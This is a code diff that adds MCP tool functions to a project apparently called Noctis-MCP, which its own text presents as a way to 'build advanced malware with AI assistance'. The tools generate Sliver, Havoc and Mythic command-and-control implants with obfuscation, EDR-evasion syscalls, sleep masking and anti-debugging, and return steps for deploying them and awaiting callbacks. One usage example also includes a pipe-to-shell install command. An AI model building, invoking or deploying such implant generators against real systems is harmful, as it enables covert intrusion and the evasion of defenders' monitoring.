@@ -801,6 +801,390 @@ That's it! You're ready to build advanced malware with AI assistance.
 
 
 # ============================================================================
+# C2 INTEGRATION TOOLS (Phase 4)
+# ============================================================================
+
+@mcp.tool()
+def generate_sliver_beacon(
+    listener_host: str,
+    listener_port: int,
+    protocol: str = "https",
+    architecture: str = "x64",
+    techniques: Optional[List[str]] = None,
+    obfuscate: bool = True
+) -> str:
+    """
+    Generate a Sliver C2 beacon with Noctis obfuscation techniques.
+    
+    This tool creates production-ready Sliver beacons with advanced evasion.
+    
+    Requirements:
+        - Sliver C2 must be installed and running
+        - sliver-client must be in PATH
+    
+    Args:
+        listener_host: C2 listener hostname or IP (e.g., "192.168.1.100" or "c2.example.com")
+        listener_port: C2 listener port (e.g., 443 for HTTPS, 53 for DNS)
+        protocol: C2 protocol - "https", "http", "dns", "tcp", or "mtls" (default: "https")
+        architecture: Target architecture - "x64" or "x86" (default: "x64")
+        techniques: List of Noctis technique IDs to apply (e.g., ["NOCTIS-T124", "NOCTIS-T118"])
+        obfuscate: Apply Noctis obfuscation (string encryption, API hashing, polymorphic, etc.)
+    
+    Returns:
+        JSON with beacon generation results including path, size, OPSEC score
+    
+    Example:
+        generate_sliver_beacon(
+            listener_host="192.168.1.100",
+            listener_port=443,
+            protocol="https",
+            techniques=["NOCTIS-T124"],
+            obfuscate=True
+        )
+    """
+    logger.info(f"Generating Sliver beacon: {protocol}://{listener_host}:{listener_port}")
+    
+    # Prepare request data
+    request_data = {
+        'listener_host': listener_host,
+        'listener_port': listener_port,
+        'protocol': protocol,
+        'architecture': architecture,
+        'techniques': techniques or [],
+        'obfuscate': obfuscate
+    }
+    
+    # Call C2 API endpoint
+    result = api_post('/api/c2/sliver/generate', request_data)
+    
+    if not result.get('success', False):
+        return json.dumps({
+            'success': False,
+            'error': result.get('error', 'Sliver beacon generation failed'),
+            'details': result.get('message', ''),
+            'help': 'Make sure Sliver C2 is installed and running. See INSTALL_SLIVER.md'
+        }, indent=2)
+    
+    return json.dumps({
+        'success': True,
+        'message': f'Sliver {protocol.upper()} beacon generated successfully',
+        'beacon_path': result.get('beacon_path'),
+        'shellcode_path': result.get('shellcode_path'),
+        'beacon_size': result.get('beacon_size'),
+        'opsec_score': result.get('opsec_score'),
+        'techniques_applied': result.get('techniques_applied', []),
+        'obfuscation_summary': result.get('obfuscation_summary', {}),
+        'compilation_time': result.get('compilation_time'),
+        'c2_info': {
+            'protocol': protocol,
+            'listener': f"{listener_host}:{listener_port}",
+            'architecture': architecture
+        },
+        'next_steps': [
+            f"1. Start Sliver listener: sliver > {protocol} -L {listener_host} -l {listener_port}",
+            f"2. Deploy beacon: {result.get('beacon_path', 'beacon.exe')}",
+            "3. Wait for callback in Sliver console"
+        ]
+    }, indent=2)
+
+
+@mcp.tool()
+def list_c2_frameworks() -> str:
+    """
+    List all supported C2 frameworks and their capabilities.
+    
+    Shows which C2 frameworks are integrated with Noctis-MCP,
+    their status, supported protocols, and features.
+    
+    Returns:
+        JSON with all supported C2 frameworks
+    
+    Example:
+        list_c2_frameworks()
+    """
+    logger.info("Listing C2 frameworks")
+    
+    result = api_get('/api/c2/frameworks')
+    
+    if not result.get('success', False):
+        return json.dumps({
+            'success': False,
+            'error': 'Failed to retrieve C2 frameworks'
+        }, indent=2)
+    
+    frameworks = result.get('frameworks', [])
+    
+    return json.dumps({
+        'success': True,
+        'frameworks': frameworks,
+        'total': len(frameworks),
+        'implemented': len([f for f in frameworks if f.get('status') == 'implemented']),
+        'summary': {
+            f['name']: {
+                'status': f['status'],
+                'protocols': f['protocols'],
+                'architectures': f['architectures']
+            }
+            for f in frameworks
+        }
+    }, indent=2)
+
+
+@mcp.tool()
+def generate_havoc_demon(
+    listener_host: str,
+    listener_port: int,
+    protocol: str = "https",
+    architecture: str = "x64",
+    sleep_technique: str = "Ekko",
+    techniques: Optional[List[str]] = None,
+    obfuscate: bool = True,
+    indirect_syscalls: bool = True,
+    stack_duplication: bool = True
+) -> str:
+    """
+    Generate a Havoc C2 demon with Noctis obfuscation and advanced evasion.
+    
+    This tool creates production-ready Havoc demons with sleep obfuscation.
+    
+    Requirements:
+        - Havoc C2 must be installed and running
+        - Havoc teamserver must be accessible
+    
+    Args:
+        listener_host: C2 listener hostname or IP (e.g., "192.168.1.100")
+        listener_port: C2 listener port (e.g., 443 for HTTPS, 445 for SMB)
+        protocol: C2 protocol - "https", "http", or "smb" (default: "https")
+        architecture: Target architecture - "x64" or "x86" (default: "x64")
+        sleep_technique: Sleep obfuscation - "Ekko", "Foliage", or "WaitForSingleObjectEx" (default: "Ekko")
+        techniques: List of Noctis technique IDs to apply (e.g., ["NOCTIS-T124", "NOCTIS-T118"])
+        obfuscate: Apply Noctis obfuscation (string encryption, API hashing, etc.)
+        indirect_syscalls: Enable indirect syscalls for EDR evasion
+        stack_duplication: Enable stack duplication for anti-debugging
+    
+    Returns:
+        JSON with demon generation results including path, size, OPSEC score
+    
+    Example:
+        generate_havoc_demon(
+            listener_host="192.168.1.100",
+            listener_port=443,
+            protocol="https",
+            sleep_technique="Ekko",
+            techniques=["NOCTIS-T124"],
+            obfuscate=True
+        )
+    """
+    logger.info(f"Generating Havoc demon: {protocol}://{listener_host}:{listener_port}")
+    logger.info(f"Sleep technique: {sleep_technique}")
+    
+    # Prepare request data
+    request_data = {
+        'listener_host': listener_host,
+        'listener_port': listener_port,
+        'protocol': protocol,
+        'architecture': architecture,
+        'sleep_technique': sleep_technique,
+        'techniques': techniques or [],
+        'obfuscate': obfuscate,
+        'indirect_syscalls': indirect_syscalls,
+        'stack_duplication': stack_duplication
+    }
+    
+    # Call C2 API endpoint
+    result = api_post('/api/c2/havoc/generate', request_data)
+    
+    if not result.get('success', False):
+        return json.dumps({
+            'success': False,
+            'error': result.get('error', 'Havoc demon generation failed'),
+            'details': result.get('message', ''),
+            'help': 'Make sure Havoc C2 is installed and teamserver is running. See docs/HAVOC_INTEGRATION.md'
+        }, indent=2)
+    
+    return json.dumps({
+        'success': True,
+        'message': f'Havoc {protocol.upper()} demon generated successfully',
+        'beacon_path': result.get('beacon_path'),
+        'shellcode_path': result.get('shellcode_path'),
+        'beacon_size': result.get('beacon_size'),
+        'opsec_score': result.get('opsec_score'),
+        'techniques_applied': result.get('techniques_applied', []),
+        'obfuscation_summary': result.get('obfuscation_summary', {}),
+        'compilation_time': result.get('compilation_time'),
+        'evasion_features': {
+            'sleep_technique': sleep_technique,
+            'indirect_syscalls': indirect_syscalls,
+            'stack_duplication': stack_duplication,
+            'protocol': protocol,
+            'architecture': architecture
+        },
+        'next_steps': [
+            f"1. Start Havoc teamserver: ./havoc server --profile ./profiles/havoc.yaotl",
+            f"2. Create listener: listener add --name test --host {listener_host} --port {listener_port}",
+            f"3. Deploy demon: {result.get('beacon_path', 'demon.exe')}",
+            "4. Wait for callback in Havoc client"
+        ]
+    }, indent=2)
+
+
+@mcp.tool()
+def generate_mythic_agent(
+    listener_host: str,
+    listener_port: int,
+    api_token: str,
+    agent_type: str = "apollo",
+    c2_profile: str = "http",
+    architecture: str = "x64",
+    techniques: Optional[List[str]] = None,
+    obfuscate: bool = True
+) -> str:
+    """
+    Generate a Mythic C2 agent with Noctis obfuscation.
+    
+    This tool creates production-ready Mythic agents with advanced features.
+    
+    Requirements:
+        - Mythic C2 must be installed and running
+        - Docker must be running
+        - API token must be valid
+    
+    Args:
+        listener_host: C2 listener hostname or IP (e.g., "192.168.1.100")
+        listener_port: C2 listener port (e.g., 80 for HTTP, 443 for HTTPS)
+        api_token: Mythic API authentication token (required)
+        agent_type: Agent type - "apollo", "apfell", "poseidon", "merlin", or "atlas" (default: "apollo")
+        c2_profile: C2 profile - "http", "https", "websocket", "dns", or "smb" (default: "http")
+        architecture: Target architecture - "x64", "x86", or "arm64" (default: "x64")
+        techniques: List of Noctis technique IDs to apply (e.g., ["NOCTIS-T124", "NOCTIS-T118"])
+        obfuscate: Apply Noctis obfuscation (string encryption, API hashing, etc.)
+    
+    Returns:
+        JSON with agent generation results including path, size, OPSEC score
+    
+    Example:
+        generate_mythic_agent(
+            listener_host="192.168.1.100",
+            listener_port=80,
+            api_token="your_api_token_here",
+            agent_type="apollo",
+            c2_profile="http",
+            obfuscate=True
+        )
+    """
+    logger.info(f"Generating Mythic {agent_type} agent: {c2_profile}://{listener_host}:{listener_port}")
+    
+    # Prepare request data
+    request_data = {
+        'listener_host': listener_host,
+        'listener_port': listener_port,
+        'agent_type': agent_type,
+        'c2_profile': c2_profile,
+        'architecture': architecture,
+        'api_token': api_token,
+        'techniques': techniques or [],
+        'obfuscate': obfuscate
+    }
+    
+    # Call C2 API endpoint
+    result = api_post('/api/c2/mythic/generate', request_data)
+    
+    if not result.get('success', False):
+        return json.dumps({
+            'success': False,
+            'error': result.get('error', 'Mythic agent generation failed'),
+            'details': result.get('message', ''),
+            'help': 'Make sure Mythic C2 is installed and running. Visit: https://github.com/its-a-feature/Mythic'
+        }, indent=2)
+    
+    return json.dumps({
+        'success': True,
+        'message': f'Mythic {agent_type} agent generated successfully',
+        'beacon_path': result.get('beacon_path'),
+        'shellcode_path': result.get('shellcode_path'),
+        'beacon_size': result.get('beacon_size'),
+        'opsec_score': result.get('opsec_score'),
+        'techniques_applied': result.get('techniques_applied', []),
+        'obfuscation_summary': result.get('obfuscation_summary', {}),
+        'compilation_time': result.get('compilation_time'),
+        'agent_info': {
+            'agent_type': agent_type,
+            'c2_profile': c2_profile,
+            'architecture': architecture,
+            'protocol': c2_profile
+        },
+        'next_steps': [
+            f"1. Start Mythic server: sudo ./mythic-cli start",
+            f"2. Access Mythic UI: https://127.0.0.1:7443",
+            f"3. Deploy agent: {result.get('beacon_path', 'agent.exe')}",
+            "4. Wait for callback in Mythic dashboard"
+        ]
+    }, indent=2)
+
+
+@mcp.tool()
+def get_c2_framework_info(framework_name: str) -> str:
+    """
+    Get detailed information about a specific C2 framework.
+    
+    Provides comprehensive details about a C2 framework including
+    protocols, features, installation status, and usage examples.
+    
+    Args:
+        framework_name: Name of the C2 framework ("Sliver", "Havoc", "Mythic", "Custom")
+    
+    Returns:
+        JSON with detailed framework information
+    
+    Example:
+        get_c2_framework_info("Sliver")
+    """
+    logger.info(f"Getting info for C2 framework: {framework_name}")
+    
+    result = api_get('/api/c2/frameworks')
+    
+    if not result.get('success', False):
+        return json.dumps({
+            'success': False,
+            'error': 'Failed to retrieve C2 frameworks'
+        }, indent=2)
+    
+    frameworks = result.get('frameworks', [])
+    framework = next((f for f in frameworks if f['name'].lower() == framework_name.lower()), None)
+    
+    if not framework:
+        return json.dumps({
+            'success': False,
+            'error': f'Framework "{framework_name}" not found',
+            'available': [f['name'] for f in frameworks]
+        }, indent=2)
+    
+    # Add usage example
+    usage_example = None
+    if framework['name'] == 'Sliver':
+        usage_example = {
+            'description': 'Generate HTTPS beacon with API hashing',
+            'code': '''generate_sliver_beacon(
+    listener_host="192.168.1.100",
+    listener_port=443,
+    protocol="https",
+    architecture="x64",
+    techniques=["NOCTIS-T124"],
+    obfuscate=True
+)''',
+            'installation': 'curl https://sliver.sh/install | sudo bash',
+            'docs': 'See INSTALL_SLIVER.md'
+        }
+    
+    return json.dumps({
+        'success': True,
+        'framework': framework,
+        'usage_example': usage_example,
+        'ready_to_use': framework['status'] == 'implemented'
+    }, indent=2)
+
+
+# ============================================================================
 # MAIN ENTRY POINT
 # ============================================================================
 
